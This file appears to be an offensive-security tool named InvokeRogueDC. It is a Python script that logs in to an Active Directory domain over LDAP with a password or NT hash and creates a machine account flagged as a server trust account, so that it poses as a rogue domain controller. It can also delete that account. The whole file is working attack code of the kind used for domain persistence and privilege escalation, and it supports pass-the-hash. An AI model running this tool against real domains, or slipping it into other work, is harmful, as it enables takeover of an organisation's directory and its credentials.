import argparse
import os
from ldap3 import Server, Connection, NTLM, SASL, KERBEROS, ALL, MODIFY_ADD, SUBTREE
from ldap3.core.exceptions import LDAPBindError
from gssapi import Credentials
import random
import string

def ldap_authentication(dc_ip, ldap_encryption, username, password, nthash, domain, kerberos):
    """
    Connect to an LDAP server using NTLM or Kerberos authentication.
    """
    if not dc_ip or not username or not domain :
        raise ValueError("[-] DC host, Username, and Domain are required.")

    # Build the server URL based on the encryption method
    if ldap_encryption == "ldaps":
        server_url = f"ldaps://{dc_ip}"
        use_ssl = True
        use_start_tls = False
    elif ldap_encryption == "ldap-starttls":
        server_url = f"ldap://{dc_ip}"
        use_ssl = False
        use_start_tls = True

    server = Server(server_url, use_ssl=use_ssl, get_info=ALL)

    # NTLM authentication
    if kerberos == False:
        user_dn_ntlm = f"{domain}\\{username}"

        if not (password or nthash):
            raise ValueError("[-] Password or NT hash is required for NTLM authentication.")
        if nthash:
            password = "aad3b435b51404eeaad3b435b51404ee" + ":" + nthash

        try:
            with Connection(server, user=user_dn_ntlm, password=password, authentication=NTLM, auto_bind=True) as conn:
                if use_start_tls:
                    conn.start_tls()
                print("[+] Successfully authenticated using NTLM.")
                return conn
        except LDAPBindError as e:
            print(f"[-] NTLM authentication failed: {e}")
            return None

    # Kerberos authentication
    elif kerberos:
        user_dn_kerberos = f"{username}@{domain}"
        ccache = os.getenv("KRB5CCNAME")
        if not ccache:
            raise ValueError("[-] KRB5CCNAME is not set. Please specify the Kerberos cache file path.")
        print("Need to work on that, not implemented yet.")
        #try:
        #    creds = Credentials(usage="initiate", store={"ccache": ccache})
        #    with Connection(server, user=user_dn_kerberos, authentication=SASL, sasl_mechanism=KERBEROS,
        #                    sasl_credentials=(None, None, creds), auto_bind=True) as conn:
        #        if use_start_tls:
        #            conn.start_tls()
        #        print("[+] Successfully authenticated using Kerberos.")
        #        return conn
        #except LDAPBindError as e:
        #    print(f"[-] Kerberos authentication failed: {e}")
        #    return None

    else:
        raise ValueError("[-] Invalid authentication method. Choose NTLM or Kerberos.")

def ldap_computer_exist(conn, computer_name, domain):
    """
    Check if a computer exists in the LDAP directory.
    """
    if not computer_name:
        raise ValueError("[-] Computer name is required.")

    search_base = ','.join([f"DC={part}" for part in domain.split('.')])
    search_filter = f'(sAMAccountName={computer_name}$)'
    conn.search(
        search_base=search_base,
        search_filter=search_filter,
        search_scope=SUBTREE,
        attributes=['distinguishedName']
    )

    if conn.entries:
        return conn.entries[0].distinguishedName.value
    return None

def ldap_create_computer(conn, computer_name, computer_pass, domain):
    """
    Create a new computer account in the LDAP directory.
    """
    if not computer_name :
        raise ValueError("[-] Computer name is required.")

    search_base = ','.join([f"DC={part}" for part in domain.split('.')])
    computer_dn = f"CN={computer_name},CN=Computers,{search_base}"
    computer_hostname = f"{computer_name.lower()}.{domain}"

    spns = [
        f"HOST/{computer_name}",
        f"HOST/{computer_hostname}",
        f"RestrictedKrbHost/{computer_name}",
        f"RestrictedKrbHost/{computer_hostname}"
    ]

    try:
        result = conn.add(
            dn=computer_dn,
            object_class=['top', 'person', 'organizationalPerson', 'user', 'computer'],
            attributes={
                'sAMAccountName': f"{computer_name}$",
                'userAccountControl': 0x82000,  # Domain controller: 0x82000 (532480)- SERVER_TRUST_ACCOUNT: 0x2000 (8192)
                'unicodePwd': ('"%s"' % computer_pass).encode('utf-16-le'),
                'dNSHostName': computer_hostname,
                'servicePrincipalName': spns
            }
        )
        if result:
            print(f"[+] Successfully created computer account: {computer_name}$ with password: {computer_pass}")
        else:
            print(f"[-] Error creating a machine account. Probably insufficient privileges.")
            print(conn.result)
    except Exception as e:
        print(f"[-] Failed to create computer account: {e}")

def generatePassword():
    return ''.join(random.choice(string.ascii_uppercase + string.digits+ string.punctuation + string.ascii_lowercase)  for _ in range(32))

def delete_computer(conn,computer_name,domain):
    """
    Delete a computer account in the LDAP directory.
    """
    if not computer_name :
        raise ValueError("[-] Computer name is required.")

    search_base = ','.join([f"DC={part}" for part in domain.split('.')])
    computer_dn = f"CN={computer_name},CN=Computers,{search_base}"

    try:
        result =conn.delete(computer_dn)
        if result:
            print(f"[+] Computer has been deleted!")
        else:
            print(f"[-] Error creating a machine account. Probably insufficient privileges.")
            print(conn.result)
    except Exception as e:
        print(f"[-] Failed to delete computer account: {e}")

def invoke_ascii_art():
    ascii_art=r"""

     ___                 _        ____                        ____   ____
    |_ _|_ ____   _____ | | _____|  _ \ ___   __ _ _   _  ___|  _ \ / ___|
     | || '_ \ \ / / _ \| |/ / _ \ |_) / _ \ / _` | | | |/ _ \ | | | |
     | || | | \ V / (_) |   <  __/  _ < (_) | (_| | |_| |  __/ |_| | |___
    |___|_| |_|\_/ \___/|_|\_\___|_| \_\___/ \__, |\__,_|\___|____/ \____|
                                             |___/

    ________________
    |               |
    |  ___________  |
    | |           | |
    | |  ROGUE    | |
    | |    DC     | |
    | |___________| |
    |               |
    |  [|||||||]    |
    |  [|||||||]    |
    |  [|||||||]    |
    |               |
    |    ____       |
    |   |    |      |
    |   '----'      |
    |_______________|

        Made by Wuentin

"""

    return ascii_art

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Create a computer account that will act as a domain controller.")
    parser.add_argument("--dc-host", required=True, help="Domain Controller.")
    parser.add_argument("--ldap-encryption", default="ldap-starttls", choices=["ldaps", "ldap-starttls"], help="LDAP encryption method (Default : ldap-starttls).")
    parser.add_argument("--username", "-u", required=True, help="Username for authentication.")
    parser.add_argument("--password", "-p", help="Password for NTLM authentication.")
    parser.add_argument("--nthash", "-H", help="NT hash for NTLM authentication.")
    parser.add_argument("--domain", "-d", required=True, help="Domain name for authentication.")
    parser.add_argument("--kerberos","-k", default=False,action='store_true', help="Use Kerberos authentication instead NTLM. NOT YET IMPLEMENTED!")
    parser.add_argument("--computer", required=True, help="Name of the computer to create in LDAP.")
    parser.add_argument("--computer-pass", help="Password for the new computer account.")
    parser.add_argument('--delete',default=False,action='store_true', help='Delete an existing computer.')

    print(invoke_ascii_art())
    args = parser.parse_args()

    

    try:
        conn = ldap_authentication(args.dc_host, args.ldap_encryption, args.username, args.password, args.nthash, args.domain, args.kerberos)
        if conn:
            print("[+] Successfully connected to the LDAP server.")
            if (args.delete):
                # Check if the computer already exists
                computer_dn = ldap_computer_exist(conn, args.computer.replace("$", ""), args.domain)
                if computer_dn:
                    print(f"[+] Computer exists: {computer_dn}")
                    delete_computer(conn,args.computer.replace("$", ""), args.domain) 
                else:
                    print("[-] Computer not found. Cancel operation.")                              
            else:
                # Check if the computer already exists
                computer_dn = ldap_computer_exist(conn, args.computer.replace("$", ""), args.domain)
                if computer_dn:
                    print(f"[+] Computer already exists: {computer_dn}")
                else:
                    print("[-] Computer not found. Creating a new computer account.")
                    if args.computer_pass:
                        ldap_create_computer(conn, args.computer.replace("$", ""), args.computer_pass, args.domain)
                    else:
                        computer_pass=generatePassword()
                        ldap_create_computer(conn, args.computer.replace("$", ""), computer_pass, args.domain)
            conn.unbind()
        else:
            print("[-] Connection failed.")
    except Exception as e:
        print(f"[-] Error  : {e}")
